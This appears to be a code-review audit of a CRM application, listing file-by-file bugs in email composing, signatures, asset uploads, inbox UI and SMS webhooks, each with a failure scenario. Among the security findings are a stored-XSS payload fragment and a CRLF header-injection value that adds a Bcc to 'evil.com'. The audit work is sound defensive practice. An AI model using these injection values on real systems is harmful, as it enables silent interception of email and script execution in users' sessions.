The loop iterates targetWorkflows but calls executeMatchingWorkflows — which itself executes ALL matching workflows for the trigger — once per iteration. With N workflows sharing the webhook secret/module, every workflow executes N times.

**Scenario:** An org has two enabled inbound_webhook workflows on Leads (e.g. 'send welcome email' and 'notify owner'). One webhook POST executes both workflows twice each — the new lead receives two copies of the welcome email on every webhook delivery.

## [MEDIUM] apps/crm/src/app/crm/settings/signatures/page.tsx:304

The signatures list renders signature.content_html straight from the API via dangerouslySetInnerHTML with no sanitization. The builder sanitizes all previews with DOMPurify (SignatureBuilder.tsx:281-287), but this page does not, and the signatures API stores content_html verbatim (POST /api/email/signatures does no sanitization), so any <script>/onerror payload in a stored signature executes in the CRM origin whenever the settings page loads.

**Scenario:** Any write path to email_signatures that isn't the builder (direct API call with the user's session, a compromised browser extension, an import/sync job, or a future admin 'shared signatures' feature) stores content_html containing <img src=x onerror=...>. The victim merely opens Settings > Email Signatures and the payload runs with their CRM session. Today the blast radius is mostly self-XSS because rows are profile-scoped, but the sink is live and inconsistent with the builder's own sanitization.

## [MEDIUM] apps/crm/src/components/email/SignatureBuilder.tsx:639

Dead, misleading settings: the 'Include in New Emails' and 'Include in Replies' switches (lines 639-660) and the matching badges on the settings page (page.tsx:310-319) are stored but never consulted by any compose or reply flow. Grep shows no consumer; EmailComposer auto-selects the default signature unconditionally (EmailComposer.tsx:161-164) and appends it to body_html regardless of these flags.

**Scenario:** A user turns OFF 'Include in Replies' on their default signature expecting replies to go out without it. They reply to a thread; the signature is attached anyway because nothing reads include_in_replies. The UI promised behavior the system does not implement.

## [MEDIUM] apps/crm/src/app/api/email/assets/route.ts:101

MIME allowlist mismatch: the upload route accepts image/svg+xml, hardcodes is_public: true (line 153), and returns a public_url built for /api/email/public-assets/{id} (line 166) — but PUBLIC_IMAGE_MIME_TYPES in public-email-asset.ts (lines 1-6) excludes SVG, so the public route 404s that exact URL forever. Either SVG should be rejected at upload or the serve route should handle it; as shipped, an SVG upload 'succeeds' and yields a permanently dead public URL.

**Scenario:** An integrator or admin uploads the company logo as SVG via POST /api/email/assets (the API advertises SVG in its own error message: 'Allowed: JPEG, PNG, GIF, WebP, SVG'). The 201 response includes a public_url; they paste it into a signature or template. Every recipient — and the settings preview — gets a broken image, and the asset library shows an asset whose copy-URL button copies a URL that returns 404.

## [MEDIUM] apps/crm/src/app/api/email/signatures/route.ts:111

The unset-previous-default update's error is silently ignored (no error check on the await at lines 111-117; same pattern in [id]/route.ts:79-86), and the unset+insert pair is not atomic. If the unset fails, two rows end up with is_default=true; if the unset succeeds but the subsequent insert/update fails, the user is left with zero default.

**Scenario:** User creates a new signature with 'Default' on while a transient RLS/connection error hits the unset UPDATE. The insert still succeeds, so two signatures are now default. EmailComposer picks whichever sorts first (is_default desc, created_at desc), which silently flips which signature gets appended to outgoing mail. Conversely, if the insert fails after a successful unset, no signature is default and new emails silently go out with no signature.

## [MEDIUM] apps/crm/src/components/email/SignatureBuilder.tsx:159

New signatures default to is_default: true (`signature?.is_default ?? true`), and the POST route then silently strips default from the user's existing default signature. Creating a secondary signature therefore steals the default unless the user notices the pre-enabled switch buried under 'Signature Settings'.

**Scenario:** A rep with a company-approved default signature creates a casual 'Personal' signature for occasional use and hits Save without scrolling to the settings card. From then on, every new email and reply auto-attaches the personal signature (EmailComposer auto-selects the default) — a silent change to what goes out to customers.

## [LOW] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:54

Hardcoded fallback identity: from 'noreply@payitforwardhealth.com', name 'Pay It Forward Health', reply_to 'support@payitforwardhealth.com' (ReplyForm.tsx line 113 has the same hardcoded fromName fallback). The rest of the inbox deliberately resolves senders from the org's verified registry.

**Scenario:** Any org other than PIFH (or PIFH after a domain change) composes mail: the send goes out as/replies route to another organization's domain, or the provider rejects the unverified From — inconsistent with the registry-driven reply path that was built to avoid exactly this.

## [LOW] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:102

The conversation row is seeded with message_count: 1 and then the inbox_messages insert fires the update_conversation_on_message trigger (baseline.sql line 21613) which increments it again — the exact double-count email-intake fixed by seeding 0 (its comment at index.ts line 500).

**Scenario:** Every conversation created via Compose shows '2 messages' in the MessageThread header while containing one; counts drift further with each subsequent message.

## [LOW] apps/crm/src/app/crm/inbox/_components/ComposeModal.tsx:95

Only data.to[0] is recorded as contact_email/to_address in the conversation and message rows; additional To recipients are dropped from the record (though actually sent).

**Scenario:** An email composed to three recipients shows a single recipient in the thread's To: line and conversation header; an auditor or teammate reading the thread cannot see who else received it.

## [LOW] apps/crm/src/app/crm/inbox/_components/MessageThread.tsx:452

The 'More actions' kebab button is dead UI — its only behavior is toast.info('More actions coming soon').

**Scenario:** An agent looking for assign/snooze/move actions clicks the visible header button and gets a 'coming soon' toast; the affordance promises functionality that does not exist.

## [LOW] apps/crm/src/app/crm/inbox/_components/InboxFilters.tsx:255

The 'Snoozed' folder filters status='snoozed', but no UI can set that status (MessageThread's Select offers only open/pending/resolved/archived, and no snooze action exists), so the folder is permanently empty; conversely a conversation given status 'snoozed' via API renders a blank status Select in MessageThread because the value has no matching item.

**Scenario:** Agent clicks 'Snoozed' expecting deferred threads and always sees an empty list; if a snoozed status ever appears via the service layer (updateConversation supports it), the thread header's status dropdown renders empty.

## [LOW] apps/crm/src/lib/inbox/new-mail-notification.ts:61

The 'already-viewing' suppression checks pathname.includes(conversation_id), but the main inbox page (/crm/inbox) selects conversations in React state without changing the route — so the module's own stated goal ('don't announce the thread the agent is already reading') fails on the primary inbox surface.

**Scenario:** Agent has thread X open on /crm/inbox and is reading a new message as it arrives; they still get the toast, the chime, and a desktop notification for that same visible message — training them to ignore notifications, which the file's header calls the worst outcome.

## [LOW] apps/crm/src/app/crm/inbox/page.tsx:119

The search term is interpolated raw into a PostgREST .or() filter string; commas or parentheses in the query break the filter grammar, the request 400s, the error is only console.error'd, and the list silently stays stale.

**Scenario:** Agent searches for 'Smith, John' or 'ACME (west)'. The conversations request fails; no error is shown and the list continues displaying the previous, unfiltered results, which the agent reads as 'no change / search matched these'.

## [LOW] apps/crm/src/components/email/EmailComposer.tsx:685

The schedule datetime-local min uses new Date().toISOString().slice(0,16), which is UTC, but datetime-local values are local time — the min is wrong by the user's UTC offset.

**Scenario:** A user in PST (UTC-8) at 10:00 local opens the schedule picker: min is set to 18:00 local-equivalent, so the picker marks every time in the next 8 hours invalid and blocks selecting 'today at 2pm'. Conversely, users east of UTC see past times allowed by the widget (caught only by the JS check after clicking Confirm).

## [LOW] apps/crm/src/components/email/EmailComposer.tsx:725

Cross-action double-fire guard is incomplete: the Send button's disabled list omits isScheduling, and the Schedule confirm button (line 705) omits isSending/isSaving — the two async submits can run concurrently on the same composed email.

**Scenario:** User clicks Confirm on the schedule popover; the request is slow. They then click Send (still enabled). The email is both scheduled for tomorrow and sent immediately — the recipient gets it twice.

## [LOW] apps/crm/src/components/email/ImageUploader.tsx:212

handleInsert uses previewImage.alt || altText — but previewImage.alt was frozen at upload/load time and is always non-empty (falls back to filename or 'Image'), so edits made in the 'Alt Text' field after the preview appears are always ignored. The field also can't be cleared: value={altText || previewImage.alt} (line 357) resurrects the old text whenever the user empties it.

**Scenario:** User uploads logo.png, then types 'Company logo — Pay It Forward Health' into the Alt Text field and clicks Insert Image. The image is inserted with alt='logo' (the filename). The visible, labeled accessibility field is dead UI — nothing typed there ever reaches the email.

## [LOW] apps/crm/src/components/email/EmailComposer.tsx:187

getFullBody bakes the signature into body_html at save time (handleSave saves getComposerData()), while signatureId stays selected and the default signature is auto-selected on every mount (line 161-164). Nothing strips a previously appended signature.

**Scenario:** User saves a draft (body persisted as content + '--' + signature). The draft is later reopened as initialBody; the default signature auto-selects again; on send, getFullBody appends the signature a second time — the recipient sees the signature block twice, and each further save/reopen cycle adds another copy.

## [LOW] apps/crm/src/components/email/SenderSelector.tsx:68

Auto-select picks the default address without checking is_verified, even though the dropdown explicitly disables unverified addresses (line 170) — the guard the UI enforces for manual selection is bypassed by the automatic path.

**Scenario:** The org's default sender is newly added and unverified. The composer silently auto-selects it as From; manual selection of that same address would be blocked. The send is attempted from an unverified domain address and is rejected/bounced by the provider after the user has already been told the email is on its way.

## [LOW] apps/crm/src/components/email/ImageUploader.tsx:139

On a non-OK response the code unconditionally awaits response.json(); a non-JSON error body (proxy 413/502 HTML page) makes json() throw, so the user sees a raw parse error instead of the failure reason. Also handleUrlSubmit (line 197) accepts any parseable URL — data:/javascript: schemes pass validation into the email img src.

**Scenario:** A 5MB image upload is rejected by the reverse proxy with an HTML 413 page. The catch shows the error toast "Unexpected token '<', \"<html>...\" is not valid JSON" — the actual cause (file too large for the gateway) is swallowed and the user has no idea what to fix.

## [LOW] apps/crm/src/components/email/AssetLibrary.tsx:85

AssetLibrary is exported but never rendered anywhere in the app (the /crm/email/assets page implements its own separate AssetLibraryPage) — the entire picker dialog, including its delete flow, is dead code. Its fetch also refires per search keystroke with no debounce or abort, so if it is ever wired up, out-of-order responses will show results for a stale query.

**Scenario:** A developer 'fixes' image insertion by pointing the toolbar at AssetLibrary assuming it is the live library; users then type 'ba' in search — the request for 'b' resolves after the one for 'ba' and the grid silently shows results for the wrong query. Today, maintenance effort spent here (it duplicates the page's logic) changes nothing users see.

## [LOW] apps/crm/src/components/email/EmailAttachments.tsx:206

removeAttachment only filters local state; it never calls DELETE /api/email/attachments (which exists), so the already-uploaded file and its email_attachments row are orphaned in storage/DB every time a user removes an attachment or the composer is abandoned.

**Scenario:** User attaches three 10MB files, changes their mind and removes them, then closes the composer. 30MB stays in the email-attachments bucket plus three DB rows, invisible to the user, accumulating for every compose session org-wide with no cleanup path.

## [LOW] apps/crm/src/components/email/EmailComposer.tsx:228

Recipient validation is only email.includes('@'); addresses like 'foo@', '@bar', 'a@b c' are accepted as chips and included in the send payload.

**Scenario:** User pastes 'john.smith@' (truncated copy) and presses Enter — it becomes a valid-looking chip. Send is attempted; the provider rejects the malformed recipient after submission, surfacing a late, confusing provider error (or failing the whole multi-recipient send) instead of an inline validation message at entry time.

## [LOW] apps/crm/src/app/api/webhooks/twilio/inbound/route.ts:137

Inbound SMS insertion has no dedupe on MessageSid (no unique constraint use, no existence check), while Twilio retries webhooks on timeout or non-2xx. The handler also runs workflow execution synchronously before responding, making >15s handling (Twilio's timeout) plausible.

**Scenario:** Workflow execution pushes the handler past Twilio's timeout; Twilio retries; the same inbound SMS is inserted into crm_messages twice and the thread shows a duplicated customer message (workflows themselves are protected by their sms-inbound idempotency key, but the conversation record is not).

## [LOW] apps/crm/src/lib/email/rfc822.ts:7

normalizeRfc822Id accepts client-supplied Message-ID/In-Reply-To/References values (passed through /api/communications/send body) with no character validation — the ANGLE regex class [^>] matches CR/LF, so values containing newlines pass through into raw provider header maps (buildResendSendPayload headers, sendViaSendGrid headers).

**Scenario:** A malicious client sends rfc822_message_id of '<x@y\r\nBcc: hidden@evil.com>'. If the provider does not strictly reject CRLF in custom header values, this becomes SMTP header injection (extra recipients/headers); at minimum, clients can forge arbitrary thread references to splice messages into other conversations in recipients' mail clients.

## [LOW] apps/crm/src/app/api/communications/send/route.ts:140

In the multipart/form-data branch every non-recipient field is kept as a string, so persist_inbox arrives as the string 'false'; the check `params.persist_inbox !== false` (strict boolean) treats it as true. Multipart callers cannot opt out of inbox persistence; similarly a string 'references' field would reach `.map` and throw before send (returned as a generic 500).

**Scenario:** An integration posts FormData with persist_inbox=false and conversation_id set (send-only, no thread copy wanted); the server persists an outbound copy to the conversation anyway, duplicating what the integration writes through its own channel.

## [LOW] apps/crm/src/app/api/email/assets/route.ts:47

The search 'sanitization' escapes , ( ) . \ with backslashes, but PostgREST's or() filter grammar does not use backslash escaping (values containing commas/parens must be double-quoted). A comma or paren in the search string still splits/breaks the logic tree — the request fails or, with a crafted string, extra conditions can be injected into the or-group (still ANDed with the org_id filter, so scoped to the caller's org). % and _ wildcards are also unescaped.

**Scenario:** A user types 'header, v2' into the asset library search box. The or() string becomes name.ilike.%header\, v2%,... which PostgREST fails to parse; the route returns 500 'Failed to fetch assets' and the library shows the error state for a perfectly normal search.

## [LOW] apps/crm/src/app/api/email/public-assets/[id]/route.ts:61

Public assets are served with Cache-Control: public, max-age=31536000, immutable keyed by asset UUID rather than a content hash, with no X-Content-Type-Options: nosniff. Deletion (DELETE /api/email/assets removes the DB row) stops the origin serving but cannot purge intermediary/CDN/browser caches for up to a year. Additionally the served Content-Type is the client-asserted file.type from upload (assets/route.ts:147), and DELETE ignores storage.remove errors (assets/route.ts:223), orphaning public blobs in the bucket.

**Scenario:** An agent uploads a headshot or a screenshot containing customer PII as an email asset, then deletes it after realizing the mistake. Anyone who already has the URL (it was embedded in sent emails) keeps getting the image from CDN/proxy caches for up to a year despite the origin returning 404.

## [LOW] apps/crm/src/lib/email/signature-html.ts:201

The empty-src <img> cleanup removes the image tag but leaves its container cell. In the PROFESSIONAL template (line 82-84) the photo lives in a <td> with 'border-right: 2px solid #0E8C9A; padding-right: 15px'; with photo_url empty the img is stripped but the bordered, padded empty cell remains in the generated email HTML.

**Scenario:** A user picks the 'Professional' layout without uploading a photo (photo_url empty is the default). The signature sent in every email renders a stray floating teal divider bar with blank space where the photo cell is, in the recipient's mail client.

## [LOW] apps/crm/src/components/email/SignatureBuilder.tsx:274

The mount/change effect unconditionally regenerates content_text from content_html via div.textContent, overwriting any stored plain-text version. textContent inserts no separators for compact HTML (anything typed in the HTML Source tab on one line gets mashed together: 'John DoeCEOjohn@x.com'), and full-image signatures produce an empty content_text (img has no text, alt is ignored), so the text/plain part of emails carries a useless or empty signature.

**Scenario:** A user pastes minified HTML into the Source tab, or uses 'Upload full signature image'. The derived content_text saved with the signature is either a run-together string or empty; recipients whose clients prefer text/plain see a garbled or missing signature.

## [LOW] apps/crm/src/app/api/email/signatures/route.ts:23

Signature reads/writes are scoped by profile_id only, never org_id (GET list here; GET/PUT/DELETE in [id]/route.ts lines 24-25, 56-58, 144-146), even though rows store org_id and getAuthProfile can swap profile.organization_id to a different active tenant. A user operating inside tenant B still lists, edits, defaults, and auto-attaches signatures created under tenant A, and the default-unset updates cross tenant boundaries.

**Scenario:** A consultant who belongs to two organizations builds a branded signature (tenant A logo, phone, compliance footer) while in tenant A, then switches active tenant to B. Composing in tenant B auto-attaches the tenant-A-branded default signature to tenant B's customer emails, and setting a default in B silently unsets the default used for A.
